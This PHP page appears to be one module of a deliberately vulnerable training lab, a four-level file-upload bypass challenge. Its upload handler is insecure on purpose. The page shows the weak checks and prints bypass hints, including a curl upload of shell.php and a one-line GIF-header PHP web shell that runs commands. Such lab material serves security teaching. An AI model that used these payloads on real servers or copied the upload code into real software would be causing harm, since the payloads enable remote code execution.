<div class="panel fade-in">
    <div class="level-info">
        <span class="level-dot medium"></span>
        <span class="badge badge-medium">中等</span>
        <h2 style="margin:0">🔄 文件上传绕过挑战</h2>
    </div>

    <div class="alert alert-warning">
        <strong>📖 模块说明：</strong>本模块模拟了多种文件上传过滤场景。
        你需要使用不同的绕过技术来上传PHP文件到服务器。
        选择难度级别开始挑战！
    </div>

    <!-- 难度选择 -->
    <div style="display:flex;gap:10px;margin-bottom:1.5rem;flex-wrap:wrap;">
        <a href="?page=upload_bypass&level=1" class="submit-btn <?php echo ($_GET['level']??'1')=='1'?'success':''; ?>">Level 1 - Content-Type</a>
        <a href="?page=upload_bypass&level=2" class="submit-btn <?php echo ($_GET['level']??'')=='2'?'warning':''; ?>">Level 2 - 黑名单</a>
        <a href="?page=upload_bypass&level=3" class="submit-btn <?php echo ($_GET['level']??'')=='3'?'danger':''; ?>">Level 3 - 文件头</a>
        <a href="?page=upload_bypass&level=4" class="submit-btn <?php echo ($_GET['level']??'')=='4'?'info':''; ?>">Level 4 - 多重检测</a>
    </div>

    <?php
    $level = $_GET['level'] ?? 1;

    $descriptions = [
        1 => '服务器仅检查HTTP请求中的 <code>Content-Type</code> 是否为 <code>image/jpeg</code> 或 <code>image/png</code>。<br>提示：使用Burp Suite抓包修改Content-Type即可绕过。',
        2 => '服务器对扩展名做了黑名单过滤，禁止了 <code>php, php3, php4, phtml</code> 等后缀。<br>提示：尝试大小写绕过、双扩展名、或使用 <code>.php5, .php7</code> 等。',
        3 => '服务器使用 <code>finfo</code> 检测文件内容是否为图片类型。<br>提示：可以制作图片马（在图片内容后添加PHP代码）。',
        4 => '服务器同时检查扩展名黑名单、MIME类型、文件头（getimagesize）三重检测。<br>提示：需要组合多种绕过技术，考虑图片马 + 扩展名绕过。',
    ];

    $level_labels = ['', '简单', '中等', '困难', '地狱'];
    $level_colors = ['', 'success', 'warning', 'danger', 'info'];
    ?>

    <div class="alert alert-<?php echo $level_colors[$level]; ?>">
        <strong>Level <?php echo $level; ?> - <?php echo $level_labels[$level]; ?>：</strong>
        <?php echo $descriptions[$level]; ?>
    </div>

    <?php
    $vuln_codes = [
        1 => '// Level 1: 仅检查 Content-Type
if ($_FILES["file"]["type"] == "image/jpeg" || $_FILES["file"]["type"] == "image/png") {
    move_uploaded_file(...);
}',
        2 => '// Level 2: 黑名单过滤扩展名
$blacklist = ["php", "php3", "php4", "phtml"];
$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
if (!in_array($ext, $blacklist)) {
    move_uploaded_file(...);
}',
        3 => '// Level 3: 检查文件头（幻数）
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES["file"]["tmp_name"]);
if (strpos($mime, "image/") === 0) {
    move_uploaded_file(...);
}',
        4 => '// Level 4: 多重检测
$ext = pathinfo($filename, PATHINFO_EXTENSION);
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES["file"]["tmp_name"]);
if (!in_array($ext, $blacklist) && strpos($mime, "image/") === 0 && getimagesize($tmp)) {
    move_uploaded_file(...);
}',
    ];
    ?>

    <div class="vuln-code">
        <span class="vuln-label">⚠️ 当前关卡漏洞代码</span>
        <pre><?php echo htmlspecialchars($vuln_codes[$level]); ?></pre>
    </div>

    <h3>📤 上传文件（挑战 Level <?php echo $level; ?>）</h3>
    <form method="POST" enctype="multipart/form-data">
        <input type="hidden" name="level" value="<?php echo $level; ?>">
        <div class="form-group">
            <label for="file">选择文件：</label>
            <input type="file" name="file" id="file" required>
        </div>
        <button type="submit" name="upload" class="submit-btn">上传 ⬆️</button>
    </form>

    <?php
    if (isset($_POST['upload'])) {
        $upload_dir = __DIR__ . '/../uploads/';
        $filename = basename($_FILES['file']['name']);
        $tmp_name = $_FILES['file']['tmp_name'];
        $target = $upload_dir . $filename;
        $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
        $error_msg = '';
        $bypass = false;

        switch ($level) {
            case 1:
                $allowed_types = ['image/jpeg', 'image/png'];
                if (in_array($_FILES['file']['type'], $allowed_types)) {
                    $bypass = true;
                } else {
                    $error_msg = '仅允许上传 JPEG/PNG 图片（Content-Type检测）！';
                }
                break;

            case 2:
                $blacklist = ['php', 'php3', 'php4', 'phtml'];
                if (!in_array($ext, $blacklist)) {
                    $bypass = true;
                } else {
                    $error_msg = '不允许上传 PHP 文件（扩展名黑名单）！';
                }
                break;

            case 3:
                $finfo = finfo_open(FILEINFO_MIME_TYPE);
                $mime = finfo_file($finfo, $tmp_name);
                finfo_close($finfo);
                if (strpos($mime, 'image/') === 0) {
                    $bypass = true;
                } else {
                    $error_msg = '仅允许上传图片文件（MIME内容检测）！';
                }
                break;

            case 4:
                $blacklist = ['php', 'php3', 'php4', 'phtml', 'php5', 'php7'];
                $finfo = finfo_open(FILEINFO_MIME_TYPE);
                $mime = finfo_file($finfo, $tmp_name);
                finfo_close($finfo);
                if (in_array($ext, $blacklist)) {
                    $error_msg = '不允许上传 PHP 文件！';
                } elseif (strpos($mime, 'image/') !== 0) {
                    $error_msg = '仅允许上传图片文件！';
                } elseif (@getimagesize($tmp_name) === false) {
                    $error_msg = '无效的图片文件！';
                } else {
                    $bypass = true;
                }
                break;
        }

        if ($bypass && move_uploaded_file($tmp_name, $target)) {
            $web_path = 'uploads/' . $filename;
            echo '<div class="alert alert-success">';
            echo '<strong>✅ 上传成功！绕过 Level ' . $level . ' 的检测！</strong><br>';
            echo '文件名：<code>' . htmlspecialchars($filename) . '</code><br>';
            echo '访问路径：<a href="' . $web_path . '" target="_blank"><code>' . htmlspecialchars($web_path) . '</code></a><br>';
            if (in_array($ext, ['php', 'php3', 'php4', 'php5', 'php7', 'phtml'])) {
                echo '<br><a href="' . $web_path . '?cmd=id" target="_blank" class="submit-btn success">执行PHP →</a>';
            }
            echo '</div>';
        } else {
            echo '<div class="alert alert-danger"><strong>❌ 上传被拦截！</strong><br>' . $error_msg . '</div>';
        }
    }
    ?>

    <div class="tip-collapse">
        <div class="tip-header">💡 各关卡绕过提示</div>
        <div class="tip-content">
            <h4>Level 1：Content-Type 绕过</h4>
            <ul>
                <li>用 Burp Suite 拦截请求，将 Content-Type 改为 image/jpeg</li>
                <li>curl：<code>curl -F "file=@shell.php;type=image/jpeg" http://target/</code></li>
            </ul>
            <h4>Level 2：黑名单绕过</h4>
            <ul>
                <li>使用 .php5、.php7 后缀（不在黑名单中）</li>
                <li>大小写绕过：.PHP、.Php</li>
                <li>双扩展名：shell.jpg.php（Apache解析漏洞）</li>
            </ul>
            <h4>Level 3：文件头检测绕过</h4>
            <ul>
                <li>制作图片马：在图片后加PHP代码</li>
                <li><code>echo 'GIF89a&lt;?php system($_GET["cmd"]);?&gt;' &gt; shell.gif</code></li>
            </ul>
            <h4>Level 4：多重检测绕过</h4>
            <ul>
                <li>图片马 + 可解析扩展名（.php5、.pht）</li>
                <li>或上传 .htaccess 使图片按PHP解析</li>
            </ul>
        </div>
    </div>
</div>

